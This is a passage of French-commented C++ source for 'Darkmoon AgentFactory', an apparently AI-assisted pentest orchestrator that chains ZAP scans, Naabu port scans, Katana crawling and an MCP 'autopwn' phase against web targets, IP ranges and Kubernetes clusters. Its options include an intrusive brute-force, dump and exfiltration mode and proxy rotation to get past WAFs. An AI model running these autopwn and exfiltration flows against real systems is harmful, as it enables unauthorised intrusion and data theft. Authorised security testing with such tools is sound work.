                }

                // Optionnel: UA morph par user
                if (!opt.zap_default_user_agent.empty()) {
                    std::string ua = opt.zap_default_user_agent + " /user=" + user;
                    zap_set_default_user_agent(opt, ua);
                }

                for (const auto &url : auth_targets) {
                    std::cout << ansi::sky << "[ZAP] Authenticated AScan (user="
                              << user << ") on " << url << ansi::reset << std::endl;
                    zap_ascan_as_user(opt,
                                      ctx_id, uid,
                                      url,
                                      opt.zap_scan_policy,
                                      opt.zap_throttle_waf ? opt.zap_throttle_ms : 0);
                }
            }

            // Les alertes générées par scanAsUser s'ajoutent à la session ZAP
            // => ton ZAP-CLI 'list' + MCP/rapport verra aussi ces vulnérabilités.
            fs::path latest_alerts_after = find_latest_alerts_json(workdir);
            if (!latest_alerts_after.empty()) last_active_alerts = latest_alerts_after;
        }
    }

    /*
    // ==========================================================
    // PHASE API : REST / GraphQL / Gateway dans le flow principal
    // ==========================================================
    {
        loginfo(std::string(ansi::bold) +
                "[API] Phase REST/GraphQL heuristique (flow principal)..." +
                ansi::reset);

        std::vector<ConfirmationCommand> api_plan;
        nlohmann::json api_plan_json = nlohmann::json::object();

        // Réutilise le même orchestrateur que le mode post-exploit,
        // mais ici on ne se limite qu'aux flows API.
        append_api_flows(opt.baseurl, workdir, api_plan, api_plan_json);

        if (!api_plan.empty()) {
            std::vector<std::filesystem::path> api_outputs;
            execute_confirmation_plan(api_plan, workdir, api_outputs);

            // Consolidation API -> api_catalog.json, api_*_findings.json, etc.
            analyse_postexploit_results_api(opt.baseurl, workdir);
        } else {
            loginfo("[API] Aucun endpoint REST/GraphQL exploitable detecte.");
        }
    }*/

    // -------------------------------------------------------------
    // 7) Phase AUTOPWN WEB/API via MCP (après tous les scans)
    // -------------------------------------------------------------
    if (!opt.mcp_path.empty()) {
        loginfo(std::string(ansi::bold) +
                "[MCP] API/Web autopwn phase (run_api_web_autopwn_mcp)..." +
                ansi::reset);
        bool ok_autopwn = run_api_web_autopwn_mcp(opt, workdir);
        if (!ok_autopwn) {
            loginfo("[MCP] run_api_web_autopwn_mcp finished (continuing with report generation).");
        }
    }
   
    // -------------------------------------------------------------
    // 8) Final: table, rapports MCP (CLI + HTML)
    // -------------------------------------------------------------
    std::cout << ansi::green << "[+] Saving..." << ansi::reset << std::endl;
    std::vector<std::pair<std::string,std::string>> rows;
    fs::path final_active;

    std::string sanitized2 = opt.baseurl;
    std::replace(sanitized2.begin(), sanitized2.end(), '/', '_');
    std::replace(sanitized2.begin(), sanitized2.end(), ':', '_');

    if (!last_active_alerts.empty()) {
        try {
            final_active = workdir / ("active_alerts_" + sanitized2 + "_final.json");
            fs::copy_file(last_active_alerts, final_active, fs::copy_options::overwrite_existing);
        } catch(...) { final_active.clear(); }
    }

    std::vector<fs::path> msg_files = find_message_files(workdir);

    rows.push_back({"active alerts", final_active.empty() ? std::string("(not found)") : final_active.string()});

    if (!msg_files.empty()) {
        rows.push_back({"Proof of Exploit", msg_files[0].filename().string()});
        for (size_t i = 1; i < msg_files.size(); ++i)
            rows.push_back({"", msg_files[i].filename().string()});
    } else {
        rows.push_back({"Proof of Exploit", std::string("(none)")});
    }
    print_kv_table(rows, std::unordered_set<std::string>{"active alerts", "Proof of Exploit"});

    // -------------------------------------------------------------
    // Construction de la liste des fichiers pour prompt-rapport.txt
    // -------------------------------------------------------------
    std::vector<fs::path> report_files;
    for (const auto &p : msg_files)        report_files.push_back(p);
    for (const auto &p : recon_files)      report_files.push_back(p);

    // Ajouter les logs d'autopwn MCP s'ils existent
    //fs::path dvga_mcp_raw     = workdir / "dvga_mcp_raw.log";
    //fs::path dvga_steps       = workdir / "dvga_steps.log";
    //fs::path dvga_history_txt = workdir / "dvga_mcp_history.txt";
    fs::path dvga_prompt      = workdir / "dvga_prompt.txt";

    //if (fs::exists(dvga_mcp_raw))     report_files.push_back(dvga_mcp_raw);
    //if (fs::exists(dvga_steps))       report_files.push_back(dvga_steps);
    //if (fs::exists(dvga_history_txt)) report_files.push_back(dvga_history_txt);
    if (fs::exists(dvga_prompt))      report_files.push_back(dvga_prompt);

    fs::path latest_alert_file = find_latest_alerts_json(workdir);
    if (report_files.empty()) {
        if (!latest_alert_file.empty())
            report_files.push_back(latest_alert_file);
        else {
            logerr("No message_*.json or alerts file available to generate report; skipping report generation.");
            loginfo("All MCP-targeted active scans launched and raw outputs saved to: " + workdir.string());
            return true;
        }
    }

    // CLI/text report via prompt-rapport.txt
    std::string report_cli_raw;
    std::cout << ansi::green << "[+] Pentest report generation (CLI)..." << ansi::reset << std::endl;
    if (!call_mcp_report_with_files(
            opt.mcp_path,
            get_exe_parent_dir(),
            report_files,
            "prompt-rapport.txt",
            report_cli_raw))
    {
        logerr("Failed to generate CLI report via prompt-rapport.txt (continuing)");
    }

    // Markdown report
    fs::path report_dir = fs::path(opt.outdir) / "report";
    try { fs::create_directories(report_dir); } catch (...) {}

    std::string hostpart_forfile = extract_hostname(opt.baseurl);
    std::string md_ts = current_datetime_string();
    fs::path md_out = report_dir / (hostpart_forfile + "_" + md_ts + "_report.md");

    std::vector<fs::path> md_report_files;
    if (!msg_files.empty()) {
        for (const auto &p : msg_files) md_report_files.push_back(p);
    } else if (!latest_alert_file.empty()) {
        md_report_files.push_back(latest_alert_file);
    }

    // On ajoute aussi les logs d'autopwn dans le rapport Markdown
    //if (fs::exists(dvga_mcp_raw))     md_report_files.push_back(dvga_mcp_raw);
    //if (fs::exists(dvga_steps))       md_report_files.push_back(dvga_steps);
    //if (fs::exists(dvga_history_txt)) md_report_files.push_back(dvga_history_txt);
    if (fs::exists(dvga_prompt))      md_report_files.push_back(dvga_prompt);

    if (!md_report_files.empty()) {
        std::string report_md_raw;
        if (!call_mcp_report_with_files(
                opt.mcp_path,
                get_exe_parent_dir(),
                md_report_files,
                "prompt-rapport-md.txt",   // <- prompt Markdown
                report_md_raw,
                md_out))                   // <- fichier .md en sortie
        {
            logerr("Failed to generate Markdown report via prompt-rapport-md.txt");
        } else {
            std::cout << ansi::green << "[+] Markdown Pentest report generation DONE"
                      << ansi::reset << std::endl;

            std::vector<std::pair<std::string,std::string>> rows2;
            rows2.push_back({"Markdown report", md_out.string()});
            rows2.push_back({"All outputs", workdir.string()});
            print_kv_table(rows2,
                std::unordered_set<std::string>{"Markdown report", "All outputs"});
        }
    } else {
        loginfo("Markdown report skipped due to missing input files.");
    }

    return true;
}

// -----------------------------------------------------------------------------
// CLI options and main (cross-platform)
// -----------------------------------------------------------------------------
struct CLIOptions {
    bool agentfactory=false;
    bool k8s=false;
    bool autopwn_postexploit = false; // nouveau mode post-exploit
    bool intrusive = false; // active les flows intrusifs (brute/dump/exfil)
    std::string lab_sender_domain; 
    std::string mcp;
    std::string mcp_autopwn_prompt_file;
    std::string zapcli;
    std::string host="localhost";
    uint16_t port=8888;
    std::string apikey;
    std::string baseurl;
    std::string outdir="zap_cli_out";
    bool wait_browse=false;
    // K8s
    std::string kube_dir="kube";
    std::string kubeconfig;
    std::string kubecontext;

    // --- Katana ---
    bool use_katana=false;
    std::string katana_bin;                 // chemin explicite si fourni
    std::vector<std::string> katana_args;   // pass-through intégral après "--"
        // -------- ZAP avancé (CLI) --------
    std::string zap_context_name;
    std::string zap_context_file;
    std::vector<std::string> zap_auth_users;
    std::vector<std::string> zap_focus_prefixes;
    std::string zap_scan_policy;
    bool zap_ajax_spider = false;
    std::string zap_proxy;        // "host:port"
    int  zap_throttle_ms = 0;
    std::string zap_default_user_agent;
    std::vector<std::string> zap_scripts; // specs "name:type:engine:path"
    // ------------ NOUVEAU : multi-host + scan config -----------------
    std::vector<std::string> targets;      // --target host|ip|cidr|url (répétable)
    std::string              targets_file; // --targets-file <path>
    std::string              default_scheme = "https"; // --default-scheme

    std::string scan_profile = "full";     // --scan-profile
    std::string custom_ports;              // --ports
    bool        enable_udp = false;        // --udp / --udp-scan

    bool        naabu_auto_tune = false;   // --naabu-auto-tune
    int         naabu_rate = 20000;        // --naabu-rate
    int         naabu_retries = 2;         // --naabu-retries
    std::string naabu_top_ports;           // --naabu-top-ports

    bool        enable_rescan = true;      // --no-rescan pour désactiver
};

static CLIOptions parse_cli(int argc, char** argv){
    CLIOptions c;
    for(int i = 1; i < argc; ++i){
        std::string a(argv[i]);

        if      (a == "--agentfactory" || a == "--web") {
        // --web = alias lisible pour le mode "orchestrateur web"
            c.agentfactory = true;
        }
        else if(a == "--k8s") c.k8s = true;
        else if(a == "--mcp" && i+1 < argc) c.mcp = argv[++i];
        else if (a == "--prompt-file" && i + 1 < argc) {
            c.mcp_autopwn_prompt_file = argv[++i];
        }
        else if(a == "--zapcli" && i+1 < argc) c.zapcli = argv[++i];
        else if(a == "--host" && i+1 < argc) c.host = argv[++i];
        else if(a == "--port" && i+1 < argc) c.port = (uint16_t)std::stoi(argv[++i]);
        else if(a == "--apikey" && i+1 < argc) c.apikey = argv[++i];
        else if(a == "--baseurl" && i+1 < argc) c.baseurl = argv[++i];
        else if(a == "--outdir" && i+1 < argc) c.outdir = argv[++i];
        else if(a == "--wait-browse") c.wait_browse = true;
        else if (a == "--intrusive") c.intrusive = true;
        else if (a == "--lab-sender" && i+1 < argc) { c.lab_sender_domain = argv[++i]; }
        // ---- ZAP avancé ----
        else if (a == "--zap-context-name" && i+1 < argc) {
            c.zap_context_name = argv[++i];
        }
        else if (a == "--zap-context-file" && i+1 < argc) {
            c.zap_context_file = argv[++i];
        }
        else if (a == "--zap-user" && i+1 < argc) {
            c.zap_auth_users.push_back(argv[++i]);
        }
        else if (a == "--zap-focus-prefix" && i+1 < argc) {
            c.zap_focus_prefixes.push_back(argv[++i]);
        }
        else if (a == "--zap-scan-policy" && i+1 < argc) {
            c.zap_scan_policy = argv[++i];
        }
        else if (a == "--zap-ajax-spider") {
            c.zap_ajax_spider = true;
        }
        else if (a == "--zap-proxy" && i+1 < argc) {
            c.zap_proxy = argv[++i]; // "ip:port"
        }
        else if (a == "--zap-throttle-ms" && i+1 < argc) {
            c.zap_throttle_ms = std::stoi(argv[++i]);
        }
        else if (a == "--zap-user-agent" && i+1 < argc) {
            c.zap_default_user_agent = argv[++i];
        }
        else if (a == "--zap-script" && i+1 < argc) {
            // name:type:engine:path
            c.zap_scripts.push_back(argv[++i]);
        }

        // ----------------- NOUVEAU : multi-host --------------------
        else if (a == "--target" && i + 1 < argc) {
            c.targets.emplace_back(argv[++i]);
        } 
        else if (a == "--targets-file" && i + 1 < argc) {
            c.targets_file = argv[++i];
        } 
        else if (a == "--default-scheme" && i + 1 < argc) {
            c.default_scheme = argv[++i]; // "http" ou "https"
        }

        // ----------------- NOUVEAU : scan profiles / Naabu ---------
        else if (a == "--scan-profile" && i + 1 < argc) {
            // full | web | mail | db | infra | custom
            c.scan_profile = argv[++i];
        } 
        else if (a == "--ports" && i + 1 < argc) {
            // ports custom pour Naabu: ex "80,443,8000-8100,u:53"
            c.custom_ports = argv[++i];
        } 
        else if (a == "--udp" || a == "--udp-scan") {
            // active le scan UDP basique
            c.enable_udp = true;
        } 
        else if (a == "--naabu-rate" && i + 1 < argc) {
            c.naabu_rate = std::stoi(argv[++i]);
        } 
        else if (a == "--naabu-retries" && i + 1 < argc) {
            c.naabu_retries = std::stoi(argv[++i]);
        } 
        else if (a == "--naabu-top-ports" && i + 1 < argc) {
            // "100", "1000", "full"
            c.naabu_top_ports = argv[++i];
        } 
        else if (a == "--naabu-auto-tune") {
            // active l’auto-tuning rate / retries
            c.naabu_auto_tune = true;
        } 
        else if (a == "--no-rescan") {
            c.enable_rescan = false;
        }
        else if (a == "--autopwn-postexploit") {
            c.autopwn_postexploit = true;
        }
        else if (a == "--intrusive") {
            c.intrusive = true;
        }

        // ---- K8s ----
        else if(a == "--kube-dir" && i+1 < argc) c.kube_dir = argv[++i];
        else if(a == "--kubeconfig" && i+1 < argc) c.kubeconfig = argv[++i];
        else if(a == "--context" && i+1 < argc) c.kubecontext = argv[++i];

        // --- Katana ---
        else if(a == "--katana") c.use_katana = true;
        else if(a == "--katana-bin" && i+1 < argc) c.katana_bin = argv[++i];
        else if(a == "--") {
            // tout ce qui suit => args katana pass-through
            for(int j = i+1; j < argc; ++j)
                c.katana_args.push_back(std::string(argv[j]));
            break;
        }
    }
    return c;
}

// Normalise une "cible" en baseurl exploitable par la pipeline Web.
// - si la ligne contient "://", on la considère déjà comme une URL complète
// - sinon on préfixe par <scheme>://
static std::string normalize_target_to_baseurl(const std::string &raw,
                                               const std::string &default_scheme) {
    if (raw.empty()) return {};
    if (raw.find("://") != std::string::npos) {
        return raw;
    }
    return default_scheme + "://" + raw;
}

// Construit la liste de toutes les cibles Web à partir du CLI :
// - baseurl principal (si fourni)
// - --target répétés
// - --targets-file (host/ip/cidr/url par ligne)
static std::vector<std::string> build_web_targets_from_cli(const CLIOptions &cli) {
    std::vector<std::string> urls;

    auto push_unique = [&urls](const std::string &u) {
        if (u.empty()) return;
        if (std::find(urls.begin(), urls.end(), u) == urls.end()) {
            urls.push_back(u);
        }
    };

    // 1) baseurl principal
    if (!cli.baseurl.empty()) {
        push_unique(cli.baseurl);
    }

    // 2) --target (host/ip/cidr/url)
    for (const auto &t : cli.targets) {
        push_unique(normalize_target_to_baseurl(t, cli.default_scheme));
    }

    // 3) --targets-file
    if (!cli.targets_file.empty()) {
        std::ifstream in(cli.targets_file);
        if (!in) {
            std::cerr << "[-] Unable to open targets file: " << cli.targets_file << "\n";
        } else {
            std::string line;
            while (std::getline(in, line)) {
                // trim simple
                auto first = line.find_first_not_of(" \t\r\n");
                auto last  = line.find_last_not_of(" \t\r\n");
                if (first == std::string::npos) continue;
                std::string trimmed = line.substr(first, last - first + 1);
                if (trimmed.empty() || trimmed[0] == '#') continue;
                push_unique(normalize_target_to_baseurl(trimmed, cli.default_scheme));
            }
        }
    }

    return urls;
}

// Retrouve le dernier workdir pour un host (ex: "example.com_2025-11-07_12-34-56")
static fs::path find_latest_workdir_for_target(const fs::path &outdir,
                                               const std::string &hostpart) {
    fs::path best;
    std::filesystem::file_time_type best_time;

    if (!fs::exists(outdir) || !fs::is_directory(outdir)) {
        return {};
    }

    for (auto const &entry : fs::directory_iterator(outdir)) {
        if (!entry.is_directory()) continue;
        std::string name = entry.path().filename().string();

        // On veut des dossiers du type "<host>_YYYY-..." mais pas "k8s_<host>..."
        std::string prefix = hostpart + "_";
        if (name.rfind(prefix, 0) != 0) continue;

        auto t = fs::last_write_time(entry.path());
        if (!best.empty()) {
            if (t > best_time) {
                best_time = t;
                best = entry.path();
            }
        } else {
            best_time = t;
            best = entry.path();
        }
    }
    return best;
}

static std::string read_zap_token_file_default()
{
    const char *path = "/zap/wrk/ZAP-API-TOKEN";
    std::ifstream in(path);
    if (!in) {
        return {};
    }

    std::string tok;
    std::getline(in, tok);

    // trim fin de ligne / espaces
    while (!tok.empty() &&
           (tok.back() == '\r' || tok.back() == '\n' ||
            tok.back() == ' '  || tok.back() == '\t')) {
        tok.pop_back();
    }
    return tok;
}

int main(int argc, char** argv) {
#ifdef _WIN32
    // UTF-8 console + ANSI VT si possible
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    enable_ansi_colors();
#endif
    // Se placer automatiquement dans $DM_HOME si défini
    if (const char* dm_home = std::getenv("DM_HOME")) {
        if (*dm_home) {
            try {
                fs::current_path(dm_home);
            } catch (const std::exception &e) {
                logerr(std::string("WARN: impossible de chdir vers DM_HOME=")
                       + dm_home + " : " + e.what());
            } catch (...) {
                logerr("WARN: impossible de chdir vers DM_HOME (exception inconnue)");
            }
        }
    }

    CLIOptions cli = parse_cli(argc, argv);

    // -----------------------------------------------------------------
    // Overrides ZAP : host / port / apikey depuis l'environnement
    // -----------------------------------------------------------------

    // 1) HOST / PORT : éviter localhost:8888 dans le conteneur "darkmoon"
    const char *env_zap_host = std::getenv("DM_ZAP_HOST");
    if (cli.host == "localhost") {
        if (env_zap_host && *env_zap_host) {
            // si l'utilisateur fournit DM_ZAP_HOST, on le respecte
            cli.host = env_zap_host;
        } else {
            // heuristique : si /zap/wrk existe, on est presque sûrement dans la stack
            std::error_code ec;
            if (std::filesystem::exists("/zap/wrk", ec)) {
                cli.host = "zap";  // nom du service docker-compose
            }
        }
    }

    const char *env_zap_port = std::getenv("DM_ZAP_PORT");
    if (env_zap_port && *env_zap_port) {
        try {
            cli.port = static_cast<uint16_t>(std::stoi(env_zap_port));
        } catch (...) {
            // on garde la valeur par défaut (8888) si parsing foire
        }
    }

    // 2) API KEY : DM_ZAP_APIKEY > ZAP_API_TOKEN > fichier /zap/wrk/ZAP-API-TOKEN
    if (cli.apikey.empty()) {
        if (const char *env_api = std::getenv("DM_ZAP_APIKEY")) {
            if (*env_api) {
                cli.apikey = env_api;
            }
        }

        if (cli.apikey.empty()) {
            if (const char *env_api2 = std::getenv("ZAP_API_TOKEN")) {
                if (*env_api2) {
                    cli.apikey = env_api2;
                }
            }
        }

        if (cli.apikey.empty()) {
            std::string tok = read_zap_token_file_default();
            if (!tok.empty()) {
                cli.apikey = tok;
            }
        }
    }

    // Initialisation de la config globale de scan à partir des options CLI
    g_intrusive_mode = cli.intrusive;
    g_scan_conf.extra_targets   = cli.targets;
    g_scan_conf.targets_file    = cli.targets_file;
    g_scan_conf.default_scheme  = cli.default_scheme;

    g_scan_conf.scan_profile    = cli.scan_profile;
    g_scan_conf.custom_ports    = cli.custom_ports;
    g_scan_conf.enable_udp      = cli.enable_udp;

    g_scan_conf.auto_tune       = cli.naabu_auto_tune;
    g_scan_conf.naabu_rate      = cli.naabu_rate;
    g_scan_conf.naabu_retries   = cli.naabu_retries;
    g_scan_conf.naabu_top_ports = cli.naabu_top_ports;

    g_scan_conf.enable_rescan   = cli.enable_rescan;
    g_lab_sender_domain = cli.lab_sender_domain; // si tu veux une var globale


    // ===================== MODE K8S =====================
    if (cli.k8s) {
        if (cli.mcp.empty()) {
            logerr("Missing --mcp");
            return 1;
        }

        AgentOptions opt;
        opt.host      = cli.host;
        opt.port      = cli.port;
        opt.apikey    = cli.apikey;
        opt.baseurl   = cli.baseurl.empty() ? "https://kubernetes.default.svc" : cli.baseurl;
        opt.outdir    = cli.outdir;
        opt.mcp_path  = cli.mcp;
        opt.wait_browse = false;
        opt.mcp_autopwn_prompt_file = cli.mcp_autopwn_prompt_file;

        // chemins K8s
        fs::path K(cli.kube_dir);
#ifdef _WIN32
        if (!cli.kubeconfig.empty()) {
            _putenv_s("KUBECONFIG", cli.kubeconfig.c_str());
        }
#else
        if (!cli.kubeconfig.empty()) {
            setenv("KUBECONFIG", cli.kubeconfig.c_str(), 1);
        }
#endif
        g_kube_dir    = K;
        g_kubeconfig  = cli.kubeconfig;
        g_kubecontext = cli.kubecontext;

        bool ok = run_agentfactory_k8s(opt);
        return ok ? 0 : 2;
    }
    // ===================== MODE WEB / AGENTFACTORY =====================
    else if (cli.agentfactory)
    {
        // -------------------------------------------------------------
        // Mode "web" / agentfactory : valeurs par défaut intelligentes
        // -------------------------------------------------------------
        fs::path exe_dir = get_exe_parent_dir();

        // 1) MCP : par défaut ./mcp à côté du binaire
        if (cli.mcp.empty()) {
            cli.mcp = (exe_dir / "mcp").string();
        }

        // 2) ZAP-CLI : par défaut ./ZAP-CLI à côté du binaire
        if (cli.zapcli.empty()) {
            cli.zapcli = (exe_dir / "ZAP-CLI").string();
        }

        // 3) Katana : activé par défaut, binaire kube/katana à côté du binaire
        if (!cli.use_katana) {
            cli.use_katana = true;
        }
        if (cli.katana_bin.empty()) {
            cli.katana_bin = (exe_dir / "kube" / "katana").string();
        }

        // 4) Katana args par défaut : depth=2 + proxy ZAP si dispo
        if (cli.katana_args.empty()) {
            // profondeur
            cli.katana_args.push_back("-depth");
            cli.katana_args.push_back("2");

            // proxy via ZAP si DM_ZAP_HOST/DM_ZAP_PORT définis
            const char* env_host = std::getenv("DM_ZAP_HOST");
            const char* env_port = std::getenv("DM_ZAP_PORT");
            std::string proxy;

            if (env_host && *env_host) {
                proxy = "http://";
                proxy += env_host;
                if (env_port && *env_port) {
                    proxy += ":";
                    proxy += env_port;
                }
            }

            if (!proxy.empty()) {
                cli.katana_args.push_back("-proxy");
                cli.katana_args.push_back(proxy);
            }
        }

        // Wiring Katana global (une fois pour toutes)
        g_use_katana          = cli.use_katana;
        g_katana_bin_explicit = cli.katana_bin;
        g_katana_passthrough  = cli.katana_args;

        auto targets = build_web_targets_from_cli(cli);
        if (targets.empty()) {
            std::cerr << "[-] You must provide at least one target via --baseurl, --target or --targets-file\n\n";
            // si tu as une fonction usage(), tu peux l'appeler ici
            // usage(argv[0]);
            return 1;
        }

        bool all_ok = true;

        for (const auto &target_url : targets) {
            std::cout << "\n[+] Starting AgentFactory pipeline for target: " << target_url << "\n";

            AgentOptions opt;
            opt.host        = cli.host;       // host de ZAP / API
            opt.port        = cli.port;
            opt.apikey      = cli.apikey;
            opt.baseurl     = target_url;     // ICI on met la cible Web courante
            opt.outdir      = cli.outdir;
            opt.mcp_path    = cli.mcp;
            opt.wait_browse = cli.wait_browse;
            opt.mcp_autopwn_prompt_file = cli.mcp_autopwn_prompt_file;

            if (!cli.zapcli.empty()) {
                opt.zapcli_path = cli.zapcli;
            }

            // --- mapping des options ZAP avancées ---
            opt.zap_context_name       = cli.zap_context_name;
            opt.zap_context_file       = cli.zap_context_file;
            opt.zap_auth_users         = cli.zap_auth_users;
            opt.zap_focus_prefixes     = cli.zap_focus_prefixes;
            opt.zap_scan_policy        = cli.zap_scan_policy;
            opt.zap_use_ajax_spider    = cli.zap_ajax_spider;
            opt.zap_default_user_agent = cli.zap_default_user_agent;

            if (!cli.zap_proxy.empty()) {
                auto pos = cli.zap_proxy.find(':');
                if (pos != std::string::npos) {
                    opt.zap_enable_proxy_chain = true;
                    opt.zap_proxy_host = cli.zap_proxy.substr(0, pos);
                    try {
                        opt.zap_proxy_port = static_cast<uint16_t>(
                            std::stoi(cli.zap_proxy.substr(pos + 1))
                        );
                    } catch (...) {
                        opt.zap_proxy_port = 0;
                    }
                }
            }

            if (cli.zap_throttle_ms > 0) {
                opt.zap_throttle_waf = true;
                opt.zap_throttle_ms  = cli.zap_throttle_ms;
            }

            for (const auto &s : cli.zap_scripts) {
                ZapScriptSpec zs;
                if (parse_zap_script_spec(s, zs)) {
                    opt.zap_scripts.push_back(zs);
                }
            }

            if (!run_agentfactory(opt)) {
                std::cerr << "[-] AgentFactory failed for target: " << target_url << "\n";
                all_ok = false;
            }
        }
        return all_ok ? 0 : 2;
    }

    else if (cli.autopwn_postexploit) {
        if (cli.outdir.empty()) {
            std::cerr << "[-] --autopwn-postexploit requiert --outdir <dir> pour relire les artefacts." << std::endl;
            return 1;
        }

        std::vector<std::string> targets = build_web_targets_from_cli(cli);
        if (targets.empty()) {
            std::cerr << "[-] Aucun target/baseurl specifie pour --autopwn-postexploit." << std::endl;
            return 1;
        }

        bool all_ok = true;
        fs::path outdir(cli.outdir);

        for (const auto &t : targets) {
            std::string baseurl = normalize_target_to_baseurl(t, cli.default_scheme);
            std::string host = extract_hostname(baseurl);
            if (host.empty()) {
                logerr("[-] Impossible d'extraire le host pour target: " + baseurl);
                all_ok = false;
                continue;
            }

            fs::path workdir = find_latest_workdir_for_target(outdir, host);
            if (workdir.empty()) {
                logerr("[-] Aucun workdir trouve dans " + outdir.string() +
                       " pour host " + host + ". As-tu lance --agentfactory avant ?");
                all_ok = false;
                continue;
            }

            loginfo(std::string(ansi::bold) + "[+] Post-exploit Web sur " + baseurl +
                    " (workdir=" + workdir.string() + ")" + ansi::reset);
            run_postexploit_web_phase(baseurl, workdir);
        }

        return all_ok ? 0 : 2;
    }
    // ===================== HELP / USAGE =====================
    else {
        std::cout <<
        "Usage:\n"
        "Darkmoon AgentFactory — Web / Infra / K8s autopwn\n"
        "\n"
        "USAGE (modes principaux)\n"
        "  Web / Infra autopwn complet (recon + ZAP + MCP + rapport):\n"
        "    darkmoon --agentfactory --mcp [cibles] [options]\n"
        "\n"
        "  Kubernetes autopwn (cluster / namespace / RBAC / workloads):\n"
        "    darkmoon --k8s --mcp [options-k8s] [options-générales]\n"
        "\n"
        "  Post-exploit Web / HTTP (flows symboliques sur artefacts existants):\n"
        "    darkmoon --autopwn-postexploit [cibles] --outdir <dir> [--default-scheme <http|https>]\n"
        "      (réutilise recon_*, alerts_*.json, confirm_* pour lancer les flows Web post-exploit)\n"
        "\n"
        "=====================================================================\n"
        "CIBLES WEB (au moins une pour --agentfactory / --autopwn-postexploit)\n"
        "  --baseurl <url>                  Cible principale (https://app.example.com)\n"
        "  --target <host|ip|cidr|url>      Cible additionnelle, répétable\n"
        "  --targets-file <file>            Fichier de cibles (1 host/ip/cidr/url par ligne)\n"
        "  --default-scheme <http|https>    Scheme pour les cibles sans scheme (defaut: https)\n"
        "\n"
        "Exemples:\n"
        "  darkmoon --agentfactory --mcp --baseurl https://app.local\n"
        "  darkmoon --agentfactory --mcp --target 10.0.0.0/24 --scan-profile web\n"
        "  darkmoon --autopwn-postexploit --targets-file targets.txt --outdir zap_cli_out\n"
        "\n"
        "=====================================================================\n"
        "CONNEXION ZAP (proxy d'analyse actif/passif)\n"
        "  --host <h>                       Host ZAP (defaut: localhost)\n"
        "  --port <p>                       Port ZAP (defaut: 8888)\n"
        "  --apikey <key>                   API key ZAP si configurée\n"
        "  --zapcli <ZAP-CLI>               Binaire zap-cli (defaut: ZAP-CLI)\n"
        "  --outdir <dir>                   Répertoire racine des artefacts (defaut: zap_cli_out)\n"
        "  --wait-browse                    Pause interactive avant le lancement des scans\n"
        "\n"
        "=====================================================================\n"
        "ZAP AVANCÉ (contextes, auth, scripts, WAF, etc.)\n"
        "  --zap-context-name <name>        Nom du contexte ZAP à utiliser (auth/users)\n"
        "  --zap-context-file <file>        Fichier .context à importer au démarrage\n"
        "  --zap-user <name>                User ZAP (répétable) pour spiderAsUser / scanAsUser\n"
        "  --zap-focus-prefix <prefix>      Restreint les scans auth à certains paths (répétable)\n"
        "  --zap-scan-policy <name>         Nom de la policy d'active scan\n"
        "  --zap-ajax-spider                Active l'Ajax spider (apps fortement JS)\n"
        "  --zap-proxy <ip:port>            Upstream proxy chain (anti-WAF, rotation IP, ...)\n"
        "  --zap-throttle-ms <ms>           Pause entre scans actifs (calmer les WAF)\n"
        "  --zap-user-agent <ua>            User-Agent par défaut injecté côté ZAP\n"
        "  --zap-script name:type:engine:path\n"
        "                                   Charge un script ZAP avancé (Zest/JS/Groovy...).\n"
        "                                   type=standalone => exécution automatique en début de run\n"
        "\n"
        "Exemples:\n"
        "  --zap-context-name appctx --zap-user admin --zap-focus-prefix /admin\n"
        "  --zap-script loginFlow:standalone:Zest:/zap/scripts/login_flow.zst\n"
        "  --zap-proxy 127.0.0.1:8080 --zap-throttle-ms 500\n"
        "\n"
        "=====================================================================\n"
        "RECON / NAABU (multi-cibles, profils de ports, UDP, tuning)\n"
        "  --scan-profile <full|web|mail|db|infra|custom>\n"
        "                                   Profil logique de ports Naabu.\n"
        "                                     full  : TCP 1-65535 (comportement historique)\n"
        "                                     web   : ports HTTP(S) usuels (80,443,8080,8443,.)\n"
        "                                     mail  : SMTP/IMAP/POP (25,110,143,587,993,995,.)\n"
        "                                     db    : SGBD courants (1433,1521,3306,5432,.)\n"
        "                                     infra : SSH/RDP/SMB, etc.\n"
        "  --ports <expr>                    Ports custom Naabu (ex: \"80,443,8000-8100,u:53\")\n"
        "  --udp | --udp-scan                Ajoute un scan UDP basique (53,123,161,500,4500)\n"
        "  --naabu-rate <n>                  Override du -rate Naabu (defaut 20000)\n"
        "  --naabu-retries <n>               Override du -retries Naabu (defaut 2)\n"
        "  --naabu-top-ports <100|1000|full> Utilise -top-ports Naabu au lieu d'un range fixe\n"
        "  --naabu-auto-tune                 Auto-tuning simple rate/retries basé sur le contexte\n"
        "  --no-rescan                       Désactive la 2e passe Naabu ciblée sur ports ouverts\n"
        "\n"
        "Notes:\n"
        "  - Les résultats Naabu sont enrichis (zgrab2, httpx, wafw00f, nuclei, dirb...).\n"
        "  - Une 2e passe Naabu ciblée peut être lancée sur les ports \"haut intérêt\".\n"
        "\n"
        "=====================================================================\n"
        "INTÉGRATION KATANA (crawler optionnel en amont de ZAP)\n"
        "  --katana                         Active Katana en pré-recon Web\n"
        "  --katana-bin <path>             Chemin explicite vers le binaire Katana\n"
        "  --                              Tout ce qui suit est passé tel quel à Katana\n"
        "\n"
        "Exemples:\n"
        "  --katana -- -depth 3 -jsl -crawl-scope all\n"
        "  --katana --katana-bin ./kube/katana -- -proxy-url http://127.0.0.1:8888\n"
        "\n"
        "Notes:\n"
        "  - Les URLs Katana filtrées (2xx/3xx) sont fusionnées avec MCP/WaybackURLs\n"
        "    puis réinjectées dans ZAP via accessUrl() pour le warm-up passif.\n"
        "\n"
        "=====================================================================\n"
        "MODE KUBERNETES (--k8s)\n"
        "  --k8s                            Active le mode cluster Kubernetes autopwn\n"
        "  --kube-dir <dir>                 Dossier outils K8s (kubectl, rbac-police,.) (defaut: kube)\n"
        "  --kubeconfig <path>              Fichier KUBECONFIG (exporté vers l'env)\n"
        "  --context <name>                 Contexte K8s à cibler\n"
        "  --baseurl <api-url>              URL API K8s (defaut: https://kubernetes.default.svc)\n"
        "\n"
        "Exemple:\n"
        "  darkmoon --k8s --mcp mcp.py --kubeconfig ~/.kube/config --context prod --outdir k8s_out\n"
        "\n"
        "=====================================================================\n"
        "MODES INTRUSIFS / LAB\n"
        "  --intrusive                      Active les flows intrusifs (brute force / dump / exfil)\n"
        "  --lab-sender <domain>            Domaine From: utilisé pour les scénarios mail de lab\n"
        "\n"
        "=====================================================================\n"
        "REMARQUES GÉNÉRALES\n"
        "  - Tous les artefacts sont stockés sous <outdir>/<host>_<timestamp>/.\n"
